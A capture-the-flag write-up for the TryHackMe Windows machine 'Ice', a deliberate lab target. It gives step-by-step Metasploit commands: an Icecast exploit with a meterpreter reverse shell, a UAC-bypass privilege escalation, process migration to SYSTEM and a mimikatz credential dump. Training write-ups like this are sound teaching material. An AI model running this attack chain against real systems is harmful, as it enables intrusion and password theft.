# TryHackMe Writeup: Ice

This is a writeup to the TryHackMe Windows machine "Ice"

<https://tryhackme.com/room/ice>

## Task 1: Recon

I start as always with a nmap scan. I want to scan all ports, perform service and OS detection and want to run a predefined script of nmap to discover common vulnerabilities. The command looks like this:

```
sudo nmap -p- -v -A -script vuln 10.10.179.20 
```

The scan takes some time, because a very big port range (all ports) is scanned. The service, OS and vulnerability detection also is performed on every discovered open port.

Here are parts of the result:

```
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
5357/tcp  open  http               Microsoft HTTPAPI httpd 2.0 
8000/tcp  open  http               Icecast streaming media server
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_http-vuln-cve2014-3704: ERROR: Script execution failed (use -d to debug)
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49158/tcp open  msrpc              Microsoft Windows RPC
49159/tcp open  msrpc              Microsoft Windows RPC
49160/tcp open  msrpc              Microsoft Windows RPC

Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-054: false
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
```

I discover that on the host named "DARK-PC" the Microsoft Remote Desktop is open at port 3389. A socalled "Icecast streaming media server" is discovered on port 8000. Both services seem to be vulnerable.

## Task 2: Gain Access

A quick search on <https://www.cvedetails.com/> reveals that the "Icecast streaming media server" has some ciritical vulnerabilities. Interesting is [this ](https://www.cvedetails.com/cve/CVE-2004-1561/)vulnerability. It allows remote code execution on the target.

I will use metasploit to check for prepared exploit on the Icecast service.

Metasploit can be started with the command 

```
msfconsole
```

I then use the

```
search Icecast
```

command to show exploits for the Icecast service. There is one available exploit:

*[Image: Icecast exploit]*

With

```
use exploit/windows/http/icecast_header
```

I select the exploit and have a look on the available options with the command

```
show options
```

*[Image: Available options]*

  
I need to set the remote host address with the command

```
set RHOST <Remote IP>
```

I also had to set the LHOST parameter of the meterpreter reverse tcp payload to my own IP address with the command

```
set LHOST <Your own IP>
```

Then I can execute the exploit by entering the command

```
exploit
```

It worked and I get a meterpreter reverse shell:

*[Image: Meterpreter reverse shell]*

## Task 3: Escalate

To check as which user we are currently operating I start a windows shell inside the meterpreter with the

```
shell
```

command. The

```
whoami
```

command tells me then that I am currently operating as the user "dark".

With the

```
systeminfo
```

command I get further information about the system, for example the OS version and build number:

*[Image: Systeminfo output]*

I can also find that the system is running on 64 bit architecture:

*[Image: x64-based PC]*

I then run a post exploit script from metasploit to detect local exploits to perform privilege escalation. There are multiple possible exploits found:

*[Image: Possible exploits]*

I backgrounded the current meterpreter session by pressing

```
CTRL+Z
```

Then I selected the previously first discovered exploit with

```
use exploit/windows/local/bypassuac_eventvwr
```

With 

```
show options
```

I detect that the SESSION parameter must be specified. I list the current sessions with the

```
SESSIONS
```

command:

*[Image: Current active sessions]*

To set the SESSION parameter in the exploit to the current session I use

```
set SESSION 1
```

I again need to specify the LHOST parameter with

```
set LHOST <Your own IP>
```

Then I start the exploit with the 

```
exploit
```

command.

With the

```
getprivs
```

command in meterpreter I list the current privileges that I have:

*[Image: Current privileges]*

## Task 4: Looting

In the meterpreter shell I execute the

```
ps
```

command. This command shows all running tasks: now also the tasks of other privileged users. I find that the "spoolsv.exe" process is executed by the SYSTEM user. 

I migrate to this process by the

```
migrate -N spoolsv.exe
```

command. With the 

```
getuid
```

command I check the current user which is "NT AUTHORITY/SYSTEM". I am SYSTEM user now. Now I have full administrator permissions.

To extract the passwords of the users, I used mimikatz. The command

```
load kiwi
```

executed in the meterpreter shell loads mimikatz. With the

```
creds_all
```

command I can dump the credentials with mimikatz and extract the password of the "Dark" user:

*[Image: Dumped credentials]*

## Task 5: Post-Exploitation

I executed the

```
help
```

command in the meterpreter shell. All questions are easy to answer by reading the help page. The machine is done!